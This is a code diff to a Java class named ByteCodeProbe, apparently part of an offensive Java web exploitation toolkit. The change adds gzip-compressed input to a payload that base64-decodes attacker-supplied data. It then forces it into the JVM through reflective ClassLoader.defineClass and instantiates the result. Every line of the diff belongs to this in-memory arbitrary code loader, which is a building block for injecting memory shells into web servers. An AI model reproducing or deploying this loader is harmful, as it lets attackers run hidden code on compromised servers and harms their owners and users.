@@ -3,9 +3,10 @@ package com.reajason.javaweb.probe.payload;
 import lombok.SneakyThrows;
 import net.bytebuddy.asm.Advice;
 
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
 import java.lang.reflect.Method;
-import java.net.URL;
-import java.net.URLClassLoader;
+import java.util.zip.GZIPInputStream;
 
 /**
  * @author ReaJason
@@ -24,7 +25,8 @@ public class ByteCodeProbe {
         Class<?> decoderClass;
         byte[] classBytes;
         String base64 = data;
-        if (!data.startsWith("yv66vgAAAD")) {
+        boolean gzip = data.startsWith("H4s");
+        if (!gzip && !data.startsWith("yv66vgAAAD")) {
             base64 = "yv66vgAAAD" + data;
         }
         try {
@@ -35,9 +37,27 @@ public class ByteCodeProbe {
             decoderClass = Class.forName("sun.misc.BASE64Decoder");
             classBytes = (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64);
         }
+        if (gzip) {
+            ByteArrayOutputStream out = new ByteArrayOutputStream();
+            GZIPInputStream gzipInputStream = null;
+            try {
+                gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(classBytes));
+                byte[] buffer = new byte[4096];
+                int n;
+                while ((n = gzipInputStream.read(buffer)) > 0) {
+                    out.write(buffer, 0, n);
+                }
+                classBytes = out.toByteArray();
+            } finally {
+                if (gzipInputStream != null) {
+                    gzipInputStream.close();
+                }
+                out.close();
+            }
+        }
         Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
         defineClass.setAccessible(true);
-        Class<?> clazz = (Class<?>) defineClass.invoke(new java.net.URLClassLoader(new java.net.URL[]{}), classBytes, 0, classBytes.length);
+        Class<?> clazz = (Class<?>) defineClass.invoke(new java.net.URLClassLoader(new java.net.URL[]{}, Thread.currentThread().getContextClassLoader()), classBytes, 0, classBytes.length);
         return ret = clazz.newInstance().toString();
     }
 
